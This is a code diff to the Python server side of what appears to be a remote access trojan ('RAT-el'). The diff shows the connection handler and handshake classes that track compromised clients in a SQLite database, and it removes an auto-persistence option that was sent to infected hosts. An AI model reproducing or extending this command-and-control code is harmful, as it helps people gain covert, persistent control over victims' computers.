@@ -20,14 +20,13 @@ class Handler(threading.Thread):
 #    ptable = PrettyTable() #Ascii tables dynamic.
 #    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.
 
-    def __init__(self,host,port,display,auto_persistence, ObjSql):
+    def __init__(self,host,port,display, ObjSql):
 
         threading.Thread.__init__(self)
         self.port = port 
         self.host = host
         self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.display = display
-        self.auto_persistence = auto_persistence
         self.ObjSql = ObjSql
         
 
@@ -106,7 +105,7 @@ class Handler(threading.Thread):
             else:
                 pass
             
-            handshake = HandShake(conn,address,self.auto_persistence)
+            handshake = HandShake(conn,address)
             handshake.daemon = True
             handshake.start()
 
@@ -120,11 +119,11 @@ Manual control allows to add crucial information like username, RAT and stores e
 The client first sends this information, then the server sends the parameters as auto persistence. 
 
     '''
-    def __init__(self, conn, address, auto_persistence):
+    def __init__(self, conn, address):
         threading.Thread.__init__(self)
         self.conn = conn
         self.address = address
-        self.auto_persistence = auto_persistence
+      
         self.ObjSql = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
 
     def sendUltraSafe(self, data):
@@ -237,16 +236,20 @@ The client first sends this information, then the server sends the parameters as
             return list_info
 
     def sendParameterOfClient(self):
+        #?????????
+        '''
         if(self.auto_persistence):
             self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"True")
             #print(" SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
-
+        
         else:
             self.sendUltraSafe("MOD_HANDSHAKE_AUTO_PERSISTENCE"+SPLIT+"False")
             #print("SEND MOD_HANDSHAKE_AUTO_PERSISTENCE | False") 
+        '''
         #print("SEND TOKEN")
         #time.sleep(0.3)
         self.sendUltraSafe("\r\n") #end echange.
+        
         print("FINISH handshake")
 
 
